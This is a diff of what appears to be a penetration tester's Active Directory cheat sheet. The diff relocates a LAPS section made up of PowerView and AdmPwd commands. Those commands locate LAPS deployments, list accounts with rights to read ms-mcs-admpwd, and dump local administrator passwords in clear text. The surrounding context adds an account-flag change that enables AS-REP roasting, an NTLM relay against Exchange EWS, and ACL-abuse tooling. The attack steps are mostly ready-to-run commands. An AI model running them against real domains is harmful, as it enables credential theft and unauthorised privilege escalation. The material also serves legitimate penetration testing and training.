@@ -182,71 +182,6 @@ Invoke-ACLScanner -ResolveGUIDS | Where-Object {$_.IdentityReference -match “<
 Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
 ```
 
-## LAPS
-- On a computer, if LAPS is in use, a library AdmPwd.dll can be found in the C:\Program Files\LAPS\CSE directory.
-- Another great tool to use: https://github.com/leoloobeek/LAPSToolkit
-
-#### Check if LAPS is installed on local computer
-```
-Get-Childitem 'C:\Program Files\LAPS\CSE\AdmPwd.dll'
-Test-Path HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\GPExtensions #DOESNT WORK? GOTTA CHECK ECPPTX MATERIAL AGAIN
-```
-
-#### Check existence of LAPS in the domain
-```
-Get-AdObject 'CN=ms-mcs-admpwd,CN=Schema,CN=Configuration,DC=<DOMAIN>,DC=<DOMAIN>'
-Get-DomainComputer | Where-object -property ms-Mcs-AdmPwdExpirationTime | select-object samaccountname
-Get-DomainGPO -Identity *LAPS*
-```
-
-#### Check to which computers the LAPS GPO is applied to
-```
-Get-DomainOU -GPLink "<Distinguishedname from GET-DOMAINGPO>" | select name, distinguishedname
-Get-DomainComputer -Searchbase "LDAP://<distinguishedname>" -Properties Distinguishedname
-```
-
-#### Check all computers without labs
-```
-Get-DomainComputer | Where-object -property ms-Mcs-AdmPwdExpirationTime -like $null | select-object samaccountname
-```
-
-#### Check the LAPS configuration
-- https://github.com/PowerShell/GPRegistryPolicy
-- Password complexity, password length, password expiration, Acccount managing LAPS
-- AdmPwdEnabled 1 = local administrator password is managed
-- Passwordcomplexity 1 = large letters, 2 = large + small letters, 3 = Large + small + numbers, 4 = large + small + numbers + specials
-```
-Parse-PolFile "<GPCFILESYSPATH FROM GET-DOMAINGPO>\Machine\Registry.pol" | select ValueName, ValueData
-```
-
-#### Find all users who can read passwords in clear text machines in OU's
-```
-Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_}
-
-Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | Select-Object ObjectDN, IdentityName
-```
-
-```
-Import-Module AdmPwd.PS.psd1
-Find-AdmPwdExtendedRights -Identity OUDistinguishedName
-```
-
-#### If retured groups, get the users:
-```
-$LAPSAdmins = Get-DomainGroup <GROUP> | Get-DomainGroupMember -Recursive
-$LAPSAdmins += Get-DomainGroup <GROUP> | Get-DomainGroupMember -Recursive
-$LAPSAdmins | select Name, distinguishedName | sort name -Unique | fortmat-table -auto
-```
-
-#### Read clear-text passwords:
-```
-Get-ADObject -SamAccountName <MACHINE NAME$> | select -ExpandProperty ms-mcs-admpwd
-Get-DomainComputer | Where-Object -Property ms-mcs-admpwd | Select-Object samaccountname, ms-mcs-admpwd
-
-#LAPS Powershell cmdlet
-Get-AdmPwdPassword -ComputerName <MACHINE NAME>
-```
-
 ## Access Control List
 - It is possible to abuse permissions (ACL's)
 - `ObjectDN` = The object the permissions apply to
@@ -589,6 +524,72 @@ sudo python3 ntlmrelayx.py -t https://<EXCH HOST>/EWS/Exchange.asmx
 ```
 python3 aclpwn.py --restore aclpwn.restore
 ```
+
+## LAPS
+- On a computer, if LAPS is in use, a library AdmPwd.dll can be found in the C:\Program Files\LAPS\CSE directory.
+- Another great tool to use: https://github.com/leoloobeek/LAPSToolkit
+
+#### Check if LAPS is installed on local computer
+```
+Get-Childitem 'C:\Program Files\LAPS\CSE\AdmPwd.dll'
+Test-Path HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\GPExtensions #DOESNT WORK? GOTTA CHECK ECPPTX MATERIAL AGAIN
+```
+
+#### Check existence of LAPS in the domain
+```
+Get-AdObject 'CN=ms-mcs-admpwd,CN=Schema,CN=Configuration,DC=<DOMAIN>,DC=<DOMAIN>'
+Get-DomainComputer | Where-object -property ms-Mcs-AdmPwdExpirationTime | select-object samaccountname
+Get-DomainGPO -Identity *LAPS*
+```
+
+#### Check to which computers the LAPS GPO is applied to
+```
+Get-DomainOU -GPLink "<Distinguishedname from GET-DOMAINGPO>" | select name, distinguishedname
+Get-DomainComputer -Searchbase "LDAP://<distinguishedname>" -Properties Distinguishedname
+```
+
+#### Check all computers without labs
+```
+Get-DomainComputer | Where-object -property ms-Mcs-AdmPwdExpirationTime -like $null | select-object samaccountname
+```
+
+#### Check the LAPS configuration
+- https://github.com/PowerShell/GPRegistryPolicy
+- Password complexity, password length, password expiration, Acccount managing LAPS
+- AdmPwdEnabled 1 = local administrator password is managed
+- Passwordcomplexity 1 = large letters, 2 = large + small letters, 3 = Large + small + numbers, 4 = large + small + numbers + specials
+```
+Parse-PolFile "<GPCFILESYSPATH FROM GET-DOMAINGPO>\Machine\Registry.pol" | select ValueName, ValueData
+```
+
+#### Find all users who can read passwords in clear text machines in OU's
+```
+Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_}
+
+Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | Select-Object ObjectDN, IdentityName
+```
+
+```
+Import-Module AdmPwd.PS.psd1
+Find-AdmPwdExtendedRights -Identity OUDistinguishedName
+```
+
+#### If retured groups, get the users:
+```
+$LAPSAdmins = Get-DomainGroup <GROUP> | Get-DomainGroupMember -Recursive
+$LAPSAdmins += Get-DomainGroup <GROUP> | Get-DomainGroupMember -Recursive
+$LAPSAdmins | select Name, distinguishedName | sort name -Unique | fortmat-table -auto
+```
+
+#### Read clear-text passwords:
+```
+Get-ADObject -SamAccountName <MACHINE NAME$> | select -ExpandProperty ms-mcs-admpwd
+Get-DomainComputer | Where-Object -Property ms-mcs-admpwd | Select-Object samaccountname, ms-mcs-admpwd
+
+#LAPS Powershell cmdlet
+Get-AdmPwdPassword -ComputerName <MACHINE NAME>
+```
+
 
 ## Delegation
 - In unconstrained and constrained Kerberos delegation, a computer/user is told what resources it can delegate authentications to;
